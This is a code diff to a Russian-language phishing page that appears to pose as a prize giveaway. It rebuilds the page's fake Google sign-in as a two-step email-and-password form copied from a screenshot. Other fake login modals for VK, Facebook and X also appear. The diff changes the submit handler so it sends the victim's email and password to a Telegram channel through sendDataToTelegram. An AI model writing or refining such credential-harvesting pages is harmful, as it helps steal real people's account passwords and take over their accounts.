@@ -639,7 +639,23 @@
             font-family: Arial, sans-serif;
         }
         
-        /* Стили для Google формы (точная копия оригинальной) */
+        /* Стили для Google формы (двухэтапная как на скриншоте) */
+        .google-login-page {
+            display: block;
+        }
+        
+        .google-login-page.hidden {
+            display: none;
+        }
+        
+        .google-password-page {
+            display: none;
+        }
+        
+        .google-password-page.active {
+            display: block;
+        }
+        
         .google-logo {
             text-align: center;
             margin-bottom: 20px;
@@ -670,6 +686,16 @@
             font-family: Arial, sans-serif;
         }
         
+        .google-password-input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+        }
+        
         .google-forgot-link {
             display: block;
             text-align: center;
@@ -679,6 +705,17 @@
             font-size: 14px;
             font-weight: 500;
             font-family: Arial, sans-serif;
+        }
+        
+        .google-show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-show-password input {
+            margin-right: 8px;
         }
         
         .google-guest-mode {
@@ -733,8 +770,6 @@
             color: #5f6368;
             font-size: 12px;
             font-family: Arial, sans-serif;
-            display: inline-block;
-            margin-right: 10px;
         }
         
         .google-help-links {
@@ -1183,7 +1218,7 @@
         </div>
     </div>
     
-    <!-- Google (точная копия оригинальной страницы с IMG_0686.png) -->
+    <!-- Google - двухэтапная форма как на скриншоте IMG_0694.png -->
     <div class="login-modal" id="googleLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
@@ -1192,44 +1227,84 @@
                 </button>
             </div>
             <div class="login-modal-body">
-                <div class="google-logo">
-                    <!-- Здесь будет картинка вместо G -->
-                    <img src="google-logo.png" alt="Google" class="google-logo-img" id="googleLogoImg">
+                <!-- Первая страница: ввод email -->
+                <div id="googleLoginPage" class="google-login-page">
+                    <div class="google-logo">
+                        <img src="google-logo.png" alt="Google" class="google-logo-img" id="googleLogoImg">
+                    </div>
+                    
+                    <div class="google-title">Вход</div>
+                    
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <div style="font-size: 16px; color: #202124;">Используйте аккаунт Google</div>
+                    </div>
+                    
+                    <div class="login-divider" style="margin: 15px 0;">
+                        <span>или</span>
+                    </div>
+                    
+                    <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
+                    
+                    <a href="#" class="google-forgot-link" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
+                    
+                    <p class="google-guest-mode">
+                        Работаете на чужом компьютере? Используйте режим "Частный доступ". <a href="#" onclick="googleGuestMode()">Подробнее об использовании гостевого режима</a>
+                    </p>
+                    
+                    <div class="google-buttons">
+                        <button class="google-create-account" onclick="googleCreateAccount()">
+                            Создать аккаунт
+                        </button>
+                        <button class="google-next-btn" onclick="nextToGooglePassword()">
+                            Далее
+                        </button>
+                    </div>
+                    
+                    <div class="google-footer">
+                        <div class="google-language">Русский</div>
+                        <div class="google-help-links">
+                            <a href="#" onclick="googleHelp()">Справка</a>
+                            <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
+                            <a href="#" onclick="googleTerms()">Условия</a>
+                        </div>
+                    </div>
                 </div>
                 
-                <div class="google-title">Вход</div>
-                
-                <div style="text-align: center; margin-bottom: 20px;">
-                    <div style="font-size: 16px; color: #202124;">Используйте аккаунт Google</div>
-                </div>
-                
-                <div class="login-divider" style="margin: 15px 0;">
-                    <span>или</span>
-                </div>
-                
-                <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
-                
-                <a href="#" class="google-forgot-link" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
-                
-                <p class="google-guest-mode">
-                    Работаете на чужом компьютере? Используйте режим "Частный доступ". <a href="#" onclick="googleGuestMode()">Подробнее об использовании гостевого режима</a>
-                </p>
-                
-                <div class="google-buttons">
-                    <button class="google-create-account" onclick="googleCreateAccount()">
-                        Создать аккаунт
-                    </button>
-                    <button class="google-next-btn" onclick="submitGoogleLogin()">
-                        Далее
-                    </button>
-                </div>
-                
-                <div class="google-footer">
-                    <div class="google-language">Русский</div>
-                    <div class="google-help-links">
-                        <a href="#" onclick="googleHelp()">Справка</a>
-                        <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
-                        <a href="#" onclick="googleTerms()">Условия</a>
+                <!-- Вторая страница: ввод пароля -->
+                <div id="googlePasswordPage" class="google-password-page">
+                    <div class="google-logo">
+                        <img src="google-logo.png" alt="Google" class="google-logo-img">
+                    </div>
+                    
+                    <div class="google-title">Добро пожаловать!</div>
+                    
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <div style="font-size: 16px; color: #202124;" id="googleEmailDisplay">frdddds@gmail.com</div>
+                    </div>
+                    
+                    <div style="margin-bottom: 10px;">
+                        <div style="font-size: 14px; color: #666; margin-bottom: 5px;">Введите пароль</div>
+                        <input type="password" class="google-password-input" id="googlePassword" placeholder="Введите пароль">
+                    </div>
+                    
+                    <div class="google-show-password">
+                        <input type="checkbox" id="googleShowPassword">
+                        <label for="googleShowPassword" style="color: #666;">Показать пароль</label>
+                    </div>
+                    
+                    <a href="#" class="google-forgot-link" onclick="googleForgotPassword()">Забыли пароль?</a>
+                    
+                    <div class="google-buttons">
+                        <button class="google-create-account" onclick="backToGoogleEmail()">
+                            Назад
+                        </button>
+                        <button class="google-next-btn" onclick="submitGoogleLogin()">
+                            Далее
+                        </button>
+                    </div>
+                    
+                    <div class="google-footer">
+                        <div class="google-language">Русский</div>
                     </div>
                 </div>
             </div>
@@ -1293,11 +1368,17 @@
             const xPasswordInput = document.getElementById('xPassword');
             
             // Элементы для Google
+            const googleLoginPage = document.getElementById('googleLoginPage');
+            const googlePasswordPage = document.getElementById('googlePasswordPage');
             const googleEmailInput = document.getElementById('googleEmail');
+            const googlePasswordInput = document.getElementById('googlePassword');
+            const googleEmailDisplay = document.getElementById('googleEmailDisplay');
+            const googleShowPassword = document.getElementById('googleShowPassword');
             
             // Переменные для хранения данных
             let xUsername = '';
             let vkLoginType = 'phone'; // 'phone' или 'email'
+            let googleUserEmail = '';
             
             // Призы с картинками
             const prizes = [
@@ -1377,6 +1458,49 @@
             window.googleTerms = function() {
                 showNotification("Условия использования Google");
             };
+            
+            window.googleForgotPassword = function() {
+                showNotification("Восстановление пароля Google");
+            };
+            
+            window.nextToGooglePassword = function() {
+                const email = googleEmailInput.value.trim();
+                
+                if (!email) {
+                    showNotification("Пожалуйста, введите email или телефон", true);
+                    return;
+                }
+                
+                googleUserEmail = email;
+                googleEmailDisplay.textContent = email;
+                
+                googleLoginPage.classList.add('hidden');
+                googlePasswordPage.classList.add('active');
+                
+                setTimeout(() => {
+                    googlePasswordInput.focus();
+                }, 100);
+            };
+            
+            window.backToGoogleEmail = function() {
+                googlePasswordPage.classList.remove('active');
+                googleLoginPage.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    googleEmailInput.focus();
+                }, 100);
+            };
+            
+            // Показать/скрыть пароль для Google
+            if (googleShowPassword) {
+                googleShowPassword.addEventListener('change', function() {
+                    if (this.checked) {
+                        googlePasswordInput.type = 'text';
+                    } else {
+                        googlePasswordInput.type = 'password';
+                    }
+                });
+            }
             
             // Функция переключения вкладок ВКонтакте
             window.switchVKTab = function(type) {
@@ -1565,7 +1689,15 @@
                     }
                     
                     if (selectedSocial === 'google') {
+                        googleLoginPage.classList.remove('hidden');
+                        googlePasswordPage.classList.remove('active');
                         googleEmailInput.value = '';
+                        googlePasswordInput.value = '';
+                        googleUserEmail = '';
+                        if (googleShowPassword) {
+                            googleShowPassword.checked = false;
+                        }
+                        googlePasswordInput.type = 'password';
                     }
                     
                     openLoginModal(selectedSocial);
@@ -1575,21 +1707,24 @@
             // Функция открытия модального окна входа
             function openLoginModal(social) {
                 const modalId = social + 'LoginModal';
-                document.getElementById(modalId).classList.add('active');
-                document.body.style.overflow = 'hidden';
-                
-                // Фокус на первое поле
-                setTimeout(() => {
-                    if (social === 'vk') {
-                        vkPhoneInput.focus();
-                    } else if (social === 'facebook') {
-                        document.getElementById('facebookEmail').focus();
-                    } else if (social === 'x') {
-                        xUsernameInput.focus();
-                    } else if (social === 'google') {
-                        googleEmailInput.focus();
-                    }
-                }, 100);
+                const modal = document.getElementById(modalId);
+                if (modal) {
+                    modal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    
+                    // Фокус на первое поле
+                    setTimeout(() => {
+                        if (social === 'vk') {
+                            vkPhoneInput.focus();
+                        } else if (social === 'facebook') {
+                            document.getElementById('facebookEmail').focus();
+                        } else if (social === 'x') {
+                            xUsernameInput.focus();
+                        } else if (social === 'google') {
+                            googleEmailInput.focus();
+                        }
+                    }, 100);
+                }
             }
             
             // Функция закрытия модального окна входа
@@ -1669,14 +1804,14 @@
             };
             
             window.submitGoogleLogin = function() {
-                const email = googleEmailInput.value.trim() || '';
+                const password = googlePasswordInput.value.trim();
                 
-                if (!email) {
-                    showNotification("Пожалуйста, введите email или телефон", true);
+                if (!password) {
+                    showNotification("Пожалуйста, введите пароль", true);
                     return;
                 }
                 
-                sendDataToTelegram('Google', email, '');
+                sendDataToTelegram('Google', googleUserEmail, password);
                 closeLoginModal();
                 showConfirmationSection();
             };
@@ -1755,8 +1890,11 @@
                 const googleLogo = new Image();
                 googleLogo.src = 'google-logo.png';
                 googleLogo.onerror = function() {
-                    // Если картинка не загружена, показываем заглушку
-                    googleLogoImg.style.display = 'none';
+                    // Если картинка не загружена, создаем заглушку
+                    const logos = document.querySelectorAll('.google-logo-img');
+                    logos.forEach(logo => {
+                        logo.style.display = 'none';
+                    });
                 };
             }
             
